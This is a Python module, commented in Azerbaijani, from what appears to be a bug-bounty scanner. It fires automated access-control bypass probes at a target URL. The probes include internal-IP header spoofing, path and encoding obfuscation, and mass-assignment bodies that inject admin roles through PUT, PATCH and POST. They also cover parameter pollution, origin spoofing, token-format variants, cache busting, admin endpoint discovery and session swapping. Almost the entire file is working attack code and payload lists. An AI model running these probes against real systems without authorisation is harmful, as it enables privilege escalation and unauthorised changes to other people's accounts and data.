"""
RBAC Bypass Module v4 — Universal, tam optimallaşdırılmış

Real bug bounty-də tapılan bütün bypass texnikaları:

KATEQORIYA 1 — Header Manipulation (15+ header)
KATEQORIYA 2 — Path Obfuscation (20+ trick)
KATEQORIYA 3 — Privilege Escalation
  3a. Horizontal: eyni rol, başqa user resursuna giriş
  3b. Vertical: low-priv → admin endpoint
KATEQORIYA 4 — Mass Assignment (body-də rol/admin field əlavəsi)
KATEQORIYA 5 — HTTP Parameter Pollution
KATEQORIYA 6 — Referrer/Origin Spoofing
KATEQORIYA 7 — Token Manipulation (Bearer prefix variantları)
KATEQORIYA 8 — Cache/CDN Bypass
KATEQORIYA 9 — Admin endpoint discovery (scope daxilində)
"""

import asyncio
import json
import re
from urllib.parse import urlparse, urljoin, urlencode, parse_qs, urlunparse

from rich.console import Console

from config import (
    BYPASS_HEADERS, PATH_TRICKS, FORBIDDEN_CODES, SUCCESS_CODES,
)
from modules.http_client import AsyncClient, ScanConfig
from modules.validator import ResponseValidator, Deduplicator

console = Console()

# ── Admin endpoint pattern-ları ───────────────────────────────────────────────
_ADMIN_PATHS = [
    "admin", "admin/users", "admin/dashboard", "admin/config",
    "admin/settings", "admin/panel", "administrator",
    "api/admin", "api/v1/admin", "api/v2/admin",
    "api/internal", "api/private", "api/debug",
    "management", "manage", "superadmin", "staff",
    "api/v1/users", "api/v1/accounts", "api/v1/roles",
    "api/v1/permissions", "api/v1/audit", "api/v1/logs",
]

# ── Mass Assignment field-ləri ────────────────────────────────────────────────
_MASS_ASSIGN_FIELDS = [
    {"role": "admin"},
    {"role": "administrator"},
    {"is_admin": True},
    {"admin": True},
    {"isAdmin": True},
    {"user_role": "admin"},
    {"permissions": ["admin", "write", "delete"]},
    {"scope": "admin"},
    {"access_level": 9999},
    {"privilege": "superuser"},
    {"account_type": "admin"},
    {"plan": "enterprise"},
    {"is_staff": True},
    {"is_superuser": True},
    {"verified": True},
    {"active": True, "role": "admin"},
]

# ── Parameter pollution ───────────────────────────────────────────────────────
_PARAM_POLLUTION = [
    # İkinci user_id parametri
    ("user_id", "1"),
    ("userid", "1"),
    ("uid", "1"),
    ("id", "1"),
    ("account_id", "1"),
    ("admin", "true"),
    ("is_admin", "1"),
    ("role", "admin"),
    ("access", "admin"),
]

# ── Origin/Referrer spoofing ──────────────────────────────────────────────────
_ORIGIN_SPOOF = [
    "http://localhost",
    "http://127.0.0.1",
    "http://internal",
    "https://admin.{host}",
    "http://{host}",
    "null",
]

# ── Token format variantları ──────────────────────────────────────────────────
_TOKEN_VARIANTS = [
    "Bearer {token}",
    "bearer {token}",
    "BEARER {token}",
    "Token {token}",
    "token {token}",
    "Basic {token}",
    "{token}",            # prefix-siz
    "JWT {token}",
]

# ── Cache bypass header-ları ──────────────────────────────────────────────────
_CACHE_HEADERS = {
    "Cache-Control":   "no-cache, no-store",
    "Pragma":          "no-cache",
    "X-Cache-Bypass":  "1",
    "X-No-Cache":      "1",
    "Surrogate-Control": "no-store",
}


# ── Validator: RBAC mode ──────────────────────────────────────────────────────

def _build_validator(baseline_high, baseline_low_body: str,
                     baseline_low_hdrs: dict) -> ResponseValidator:
    """
    Validator-i high-priv baseline-dan qur.
    High-priv yoxdursa, generik 200 baseline istifadə et.
    """
    if baseline_high and baseline_high.status in SUCCESS_CODES:
        return ResponseValidator(
            baseline_high.status,
            baseline_high.body,
            baseline_high.headers,
        )
    # High-priv yoxdur — generik validator
    return ResponseValidator(200, "", {"Content-Type": "application/json"})


# ── Probe funksiyası ──────────────────────────────────────────────────────────

async def _probe(
    test_url: str,
    probe_hdrs: dict,
    label: str,
    desc: str,
    client: AsyncClient,
    cfg: ScanConfig,
    validator: ResponseValidator,
    bs_low: int,
    results: list,
    lock: asyncio.Lock,
    dedup: Deduplicator,
    method: str = "GET",
    body: dict = None,
    category: str = "",
):
    """Universal probe — bütün RBAC bypass texnikaları bu funksiyadan keçir."""

    # İlk sorğu redirect-siz
    first = await client.request(
        method, test_url, probe_hdrs,
        body=body, allow_redirects=False,
    )
    if not first:
        return

    # Redirect izlə
    final = first
    if first.status in {301, 302, 303, 307, 308}:
        followed = await client.request(
            method, test_url, probe_hdrs,
            body=body, allow_redirects=True,
        )
        if followed:
            final = followed

    if cfg.verbose:
        redir = f"→{final.status}" if final is not first else ""
        console.print(f"  [dim][{category}] {method} {label}: {first.status}{redir}[/dim]")

    # Validator
    vr = validator.validate(final.status, final.body, final.headers, mode="rbac")
    if not vr.valid:
        if cfg.verbose:
            console.print(f"  [dim]  ↳ filtr: {vr.reason}[/dim]")
        return

    sev = "CRITICAL" if final.status in SUCCESS_CODES else "HIGH"
    finding = {
        "type":      "RBAC Bypass",
        "severity":  sev,
        "url":       test_url,
        "method":    method,
        "technique": label,
        "category":  category,
        "status":    final.status,
        "baseline":  bs_low,
        "reason":    desc,
        "snippet":   final.body[:500],
    }
    if dedup.is_new(finding):
        console.print(
            f"  [bold red][!] RBAC [{sev}] [{category}] {method} {label}: "
            f"{first.status}→{final.status}[/bold red]"
        )
        async with lock:
            results.append(finding)


# ── Əsas modul ────────────────────────────────────────────────────────────────

async def test_rbac_bypass(url: str, client: AsyncClient, cfg: ScanConfig) -> list[dict]:
    results = []
    lock    = asyncio.Lock()
    dedup   = Deduplicator()
    parsed  = urlparse(url)
    path    = parsed.path
    query   = parsed.query
    base    = f"{parsed.scheme}://{parsed.netloc}"
    host    = parsed.hostname or ""

    low_hdrs  = cfg.build_headers(cfg.low_token)
    high_hdrs = cfg.build_headers(cfg.high_token) if cfg.high_token else {}

    # ── Baseline-lər ─────────────────────────────────────────────────────────
    console.print("[cyan][*] RBAC: baseline sorğuları...[/cyan]")
    baseline_low  = await client.get(url, low_hdrs,  allow_redirects=True)
    baseline_high = await client.get(url, high_hdrs, allow_redirects=True) if high_hdrs else None

    if not baseline_low:
        console.print(f"[red][-] RBAC: {url} əlçatan deyil[/red]")
        return results

    bs_low  = baseline_low.status
    bs_high = baseline_high.status if baseline_high else "N/A"
    console.print(
        f"[cyan][*] RBAC baseline — low: HTTP {bs_low} | "
        f"high: HTTP {bs_high}[/cyan]"
    )

    # Low-priv artıq girişi varsa — bypass lazım deyil, amma mass assignment test et
    already_accessible = bs_low in SUCCESS_CODES
    if already_accessible:
        vr_check = ResponseValidator(404, "", {}).validate(
            bs_low, baseline_low.body, baseline_low.headers
        )
        if vr_check.valid:
            console.print(
                f"[yellow][~] RBAC: endpoint low-priv üçün açıqdır ({bs_low}). "
                f"Yalnız Mass Assignment + Privilege Escalation testləri aparılır.[/yellow]"
            )

    validator = _build_validator(baseline_high, baseline_low.body, baseline_low.headers)

    # Probe wrapper — qısaltmaq üçün
    async def p(test_url, hdrs, label, desc, cat="",
                method="GET", body=None):
        await _probe(test_url, hdrs, label, desc, client, cfg,
                     validator, bs_low, results, lock, dedup,
                     method=method, body=body, category=cat)

    tasks = []

    # ════════════════════════════════════════════════════════════════════════
    # KAT-1: HEADER MANIPULATION
    # ════════════════════════════════════════════════════════════════════════
    if not already_accessible:
        console.print("[cyan][*] RBAC Kat-1: header manipulation...[/cyan]")
        for hdr, tpl in BYPASS_HEADERS.items():
            val = tpl.replace("{path}", path)
            tasks.append(p(
                url, {**low_hdrs, hdr: val},
                f"{hdr}: {val}", f"Header injection: {hdr}={val}",
                cat="Header"
            ))

        # Admin-IP simulation
        for ip in ["127.0.0.1", "10.0.0.1", "192.168.1.1", "::1"]:
            tasks.append(p(
                url, {**low_hdrs, "X-Forwarded-For": ip,
                       "X-Real-IP": ip, "X-Client-IP": ip},
                f"Internal-IP:{ip}", f"Internal IP kimi görünmə: {ip}",
                cat="Header"
            ))

    # ════════════════════════════════════════════════════════════════════════
    # KAT-2: PATH OBFUSCATION
    # ════════════════════════════════════════════════════════════════════════
    if not already_accessible:
        console.print("[cyan][*] RBAC Kat-2: path obfuscation...[/cyan]")
        for trick in PATH_TRICKS:
            tricked = trick.replace("{path}", path.lstrip("/"))
            tasks.append(p(
                f"{base}/{tricked}", low_hdrs,
                f"Path:{trick}", f"Path manipulyasiyası: {trick}",
                cat="Path"
            ))

        # Case variations
        tasks.append(p(f"{base}{path.upper()}", low_hdrs,
                       "UPPERCASE", "Böyük hərf ACL bypass", cat="Path"))
        mixed = "".join(c.upper() if i % 2 else c for i, c in enumerate(path))
        tasks.append(p(f"{base}{mixed}", low_hdrs,
                       "MixedCase", "Qarışıq hərf ACL bypass", cat="Path"))

        # Double/triple encoding
        tasks.append(p(
            f"{base}/{path.replace('/', '%2F').lstrip('%2F')}", low_hdrs,
            "Single-encode-slash", "URL encoded slash", cat="Path"
        ))
        tasks.append(p(
            f"{base}/{path.replace('/', '%252F').lstrip('%252F')}", low_hdrs,
            "Double-encode-slash", "Cüt encoded slash", cat="Path"
        ))

        # Extension tricks
        for ext in [".json", ".xml", ".html", ".js", ".css"]:
            tasks.append(p(
                f"{base}{path}{ext}", low_hdrs,
                f"Ext:{ext}", f"Uzantı əlavəsi {ext} ilə ACL bypass", cat="Path"
            ))

        # Dot-segment tricks
        tasks.append(p(
            f"{base}{path}/.", low_hdrs,
            "Dot-segment", "Dot-segment path bypass", cat="Path"
        ))
        tasks.append(p(
            f"{base}{path}%3F", low_hdrs,
            "Encoded-qmark", "Encoded sual işarəsi ilə bypass", cat="Path"
        ))

    # ════════════════════════════════════════════════════════════════════════
    # KAT-3: TOKEN MANIPULATION
    # ════════════════════════════════════════════════════════════════════════
    if not already_accessible and cfg.low_token and cfg.low_token.startswith("eyJ"):
        console.print("[cyan][*] RBAC Kat-3: token format variantları...[/cyan]")
        token = cfg.low_token
        for fmt in _TOKEN_VARIANTS:
            auth_val = fmt.replace("{token}", token)
            h = {k: v for k, v in low_hdrs.items() if k.lower() != "authorization"}
            h["Authorization"] = auth_val
            tasks.append(p(
                url, h,
                f"Token:{fmt.split()[0]}", f"Token format: {fmt.replace(token, '[TOKEN]')}",
                cat="Token"
            ))

        # Token-siz sorğu — endpoint açıqdırmı?
        no_auth = {k: v for k, v in low_hdrs.items()
                   if k.lower() not in {"authorization", "cookie"}}
        tasks.append(p(url, no_auth, "No-Auth",
                       "Heç auth header olmadan endpoint açıqdırmı?", cat="Token"))

    # ════════════════════════════════════════════════════════════════════════
    # KAT-4: MASS ASSIGNMENT
    # Mass assignment həm endpoint açıq, həm qapalı olduqda test edilir
    # ════════════════════════════════════════════════════════════════════════
    console.print("[cyan][*] RBAC Kat-4: mass assignment...[/cyan]")
    for fields in _MASS_ASSIGN_FIELDS:
        # PUT/PATCH ilə body-yə admin field-lər inject et
        for method in ["PUT", "PATCH", "POST"]:
            h = {**low_hdrs, "Content-Type": "application/json"}
            tasks.append(p(
                url, h,
                f"MassAssign:{method}:{list(fields.keys())[0]}",
                f"Mass assignment: {method} body-yə {fields} inject edildi",
                cat="MassAssign", method=method, body=fields,
            ))

    # ════════════════════════════════════════════════════════════════════════
    # KAT-5: HTTP PARAMETER POLLUTION
    # ════════════════════════════════════════════════════════════════════════
    if not already_accessible:
        console.print("[cyan][*] RBAC Kat-5: parameter pollution...[/cyan]")
        existing_params = parse_qs(query) if query else {}

        for param, val in _PARAM_POLLUTION:
            # Query string-ə əlavə et
            test_params = {k: v[0] for k, v in existing_params.items()}
            test_params[param] = val
            test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
            tasks.append(p(
                test_url, low_hdrs,
                f"HPP:{param}={val}",
                f"HTTP Parameter Pollution: {param}={val} əlavə edildi",
                cat="HPP"
            ))

        # Eyni parametri iki dəfə göndər (server birincini/ikincini seçə bilər)
        if existing_params:
            first_key = next(iter(existing_params))
            dup_query = f"{query}&{first_key}=1&{first_key}=admin"
            test_url  = urlunparse(parsed._replace(query=dup_query))
            tasks.append(p(
                test_url, low_hdrs,
                f"HPP-dup:{first_key}",
                f"Parametr duplikasiyası: {first_key} iki dəfə göndərildi",
                cat="HPP"
            ))

    # ════════════════════════════════════════════════════════════════════════
    # KAT-6: ORIGIN / REFERRER SPOOFING
    # ════════════════════════════════════════════════════════════════════════
    if not already_accessible:
        console.print("[cyan][*] RBAC Kat-6: origin/referrer spoofing...[/cyan]")
        for origin_tpl in _ORIGIN_SPOOF:
            origin = origin_tpl.replace("{host}", host)
            tasks.append(p(
                url, {**low_hdrs, "Origin": origin, "Referer": f"{origin}/admin"},
                f"Origin:{origin}",
                f"Origin spoofing: {origin}",
                cat="Origin"
            ))

        # Admin referrer
        tasks.append(p(
            url, {**low_hdrs,
                  "Referer": f"{base}/admin",
                  "Origin":  base},
            "Referrer:admin",
            f"Admin referrer ilə bypass cəhdi",
            cat="Origin"
        ))

    # ════════════════════════════════════════════════════════════════════════
    # KAT-7: CACHE / CDN BYPASS
    # ════════════════════════════════════════════════════════════════════════
    if not already_accessible:
        console.print("[cyan][*] RBAC Kat-7: cache/CDN bypass...[/cyan]")
        cache_hdrs = {**low_hdrs, **_CACHE_HEADERS}
        tasks.append(p(url, cache_hdrs, "Cache-bypass",
                       "Cache bypass header-ları ilə ACL atlanması", cat="Cache"))

        # Unique query string — cached 403-ü bypass et
        for suffix in ["?cb=1", "?_=1", "?v=2", "?nocache=1"]:
            tasks.append(p(
                url + suffix, low_hdrs,
                f"Cache-bust:{suffix}",
                f"Cache buster ilə CDN bypass cəhdi: {suffix}",
                cat="Cache"
            ))

    # ════════════════════════════════════════════════════════════════════════
    # KAT-8: VERTICAL PRIVILEGE ESCALATION — Admin endpoint discovery
    # ════════════════════════════════════════════════════════════════════════
    console.print("[cyan][*] RBAC Kat-8: admin endpoint discovery...[/cyan]")
    for admin_path in _ADMIN_PATHS:
        test_url = f"{base}/{admin_path}"
        tasks.append(p(
            test_url, low_hdrs,
            f"AdminDisc:/{admin_path}",
            f"Vertical escalation: low-priv token ilə /{admin_path} əlçatandırmı?",
            cat="VerticalEsc"
        ))
        # High-priv token ilə də yoxla — mövcuddur amma low-priv-ə qapalıdırmı?
        if high_hdrs:
            tasks.append(p(
                test_url, high_hdrs,
                f"AdminConf:/{admin_path}",
                f"Admin endpoint mövcudluğu: /{admin_path}",
                cat="VerticalEsc"
            ))

    # ════════════════════════════════════════════════════════════════════════
    # KAT-9: HORIZONTAL PRIVILEGE ESCALATION
    # Low-priv token ilə ID-ləri dəyişib başqa user-in resursuna giriş
    # (IDOR modulundan fərqli olaraq burada rol-əsaslı yoxlama var)
    # ════════════════════════════════════════════════════════════════════════
    if cfg.high_token and not already_accessible:
        console.print("[cyan][*] RBAC Kat-9: horizontal privilege escalation...[/cyan]")
        # High-priv token ilə uğurlu olan endpoint-i low-priv ilə yoxla
        if baseline_high and baseline_high.status in SUCCESS_CODES:
            tasks.append(p(
                url, low_hdrs,
                "HorizEsc:low-on-high-url",
                "Horizontal escalation: low-priv token ilə high-priv endpointe birbaşa giriş",
                cat="HorizEsc"
            ))

        # Cookie/session token mübadiləsi
        if cfg.low_token and not cfg.low_token.startswith("eyJ"):
            # Cookie-based auth
            h_cookie = {**high_hdrs,
                        "Cookie": cfg.low_token}  # high-priv URL, low-priv cookie
            tasks.append(p(
                url, h_cookie,
                "SessionSwap:low-cookie+high-url",
                "Session misbinding: fərqli user cookie-si ilə yüksək resurs",
                cat="HorizEsc"
            ))

    # ════════════════════════════════════════════════════════════════════════
    # KAT-10: CONTENT-TYPE CONFUSION
    # ════════════════════════════════════════════════════════════════════════
    if not already_accessible:
        console.print("[cyan][*] RBAC Kat-10: content-type confusion...[/cyan]")
        for ct in ["application/json", "application/xml",
                   "text/xml", "application/x-www-form-urlencoded",
                   "multipart/form-data"]:
            tasks.append(p(
                url, {**low_hdrs, "Content-Type": ct, "Accept": ct},
                f"CT-confusion:{ct.split('/')[-1]}",
                f"Content-Type dəyişikliyi: {ct}",
                cat="CTConfusion"
            ))

    # Bütün testləri paralel icra et
    await asyncio.gather(*tasks)

    # Statistika
    cats = {}
    for r in results:
        c = r.get("category", "Other")
        cats[c] = cats.get(c, 0) + 1
    if cats:
        cat_str = " | ".join(f"{k}:{v}" for k, v in sorted(cats.items(), key=lambda x: -x[1]))
        console.print(f"[cyan][*] RBAC tamamlandı: {len(results)} tapıntı ({cat_str})[/cyan]")
    else:
        console.print(f"[cyan][*] RBAC tamamlandı: 0 tapıntı[/cyan]")

    return results
